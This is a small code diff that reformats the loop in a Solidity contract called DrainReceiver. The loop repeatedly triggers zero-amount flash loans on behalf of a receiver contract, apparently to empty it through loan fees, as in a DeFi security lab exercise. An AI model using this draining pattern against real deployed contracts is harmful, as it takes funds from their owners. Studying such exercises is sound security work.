@@ -15,7 +15,9 @@ contract DrainReceiver {
     }
 
     function drain() external {
-        for (uint256 i = 0; i < 10; i++) pool.flashLoan(reciever, ETH, 0, "");
+        for (uint256 i = 0; i < 10; i++) {
+            pool.flashLoan(reciever, ETH, 0, "");
+        }
     }
 
     receive() external payable {}
